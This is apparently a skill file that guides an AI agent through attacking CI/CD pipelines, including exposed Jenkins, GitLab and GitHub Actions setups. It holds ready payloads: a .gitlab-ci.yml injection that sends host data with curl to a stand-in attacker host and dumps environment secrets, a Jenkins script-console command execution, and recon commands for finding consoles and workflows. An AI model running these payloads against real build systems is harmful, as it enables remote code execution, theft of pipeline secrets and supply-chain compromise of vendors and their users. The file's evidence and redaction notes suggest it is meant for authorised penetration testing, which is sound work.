---
name: ci-cd-pipeline
description: CI/CD pipeline security — exposed Jenkins/GitLab Runners/GitHub Actions, pipeline config injection, secrets in build logs, artifact leakage, and supply-chain entry points. Use when the target is a software vendor, or scope includes their CI hosts/infra.
category: supply-chain-ai
---

# CI/CD Pipeline Security

## Detection
- Find CI surfaces: `jenkins.$D`, `gitlab.$D`, `.github/workflows` on public repos, `drone`, `circleci`, `buildkite` hosts, `nexus`, `artifactory`, `harbor`.
- Check: unauthenticated Jenkins UI, GitLab public projects with pipeline configs, workflow files on public repos.
- Fingerprint: `X-Jenkins`, `X-GitLab-Event`, `Server: nginx` + `Jenkins`, `/user/login`, `/api/json`.

## Exploitation
1. **Unauthenticated Jenkins**: script console (`/script`) → Groovy RCE.
2. **Weak GitLab auth**: public/internal projects, missing 2FA, project access token leaks in URLs.
3. **Pipeline config injection**: contribute/push to a repo (or PR to a public project) → `env`/`script` in `.gitlab-ci.yml`/`workflow.yml` runs with pipeline secrets on their runners.
4. **Secrets in build logs/artifacts**: `artifacts/` downloadable, `.npmrc`, `.env` in build artifacts, `echo $SECRET`.
5. **Self-hosted runner abuse**: a runner with `runs-on: self-hosted` executing attacker-controlled code → host compromise.
6. **Leaked deploy keys/tokens** in public repos (secrets-scanning skill).

## Payloads
```yaml
# .gitlab-ci.yml injection
stages: [x]
x:
  stage: x
  script:
    - curl -d @/etc/hostname http://attacker/c || true
    - env | base64
```
```groovy
// Jenkins script console
println "id".execute().text
```

## Tool Commands
```powershell
curl.exe -s "$U/script" -i        # Jenkins script console reachable?
curl.exe -s "$U/api/json" -i
curl.exe -s "https://api.github.com/repos/$ORG/$REPO/actions/workflows" -H "Authorization: token $TOKEN" | python -m json.tool
```

## Verification & Evidence
- Impact = RCE on CI host, or pipeline secret leakage, or code execution on self-hosted runners.
- Redact secrets; capture exact pipeline file + runner + evidence.